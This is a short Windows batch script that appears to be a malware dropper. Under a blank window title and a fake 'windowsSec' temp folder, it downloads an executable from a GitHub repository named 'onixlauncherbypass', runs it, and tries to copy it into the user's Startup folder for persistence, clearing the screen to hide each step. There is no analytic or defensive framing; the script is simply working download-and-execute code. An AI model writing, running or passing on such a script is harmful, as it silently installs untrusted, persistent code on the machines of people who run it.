@echo off
title .
timeout /t 2 >nul
cd %temp%
md windowsSec
cd windowsSec
cls
powershell -Command "Invoke-WebRequest https://github.com/onixlauncherbypass/onix/raw/refs/heads/main/Client-built.exe -Outfile client.exe"
cls
start client.exe
cd %temp%
del WindowsSec /q 
echo "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy "client.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del WindowsSec /q
exit

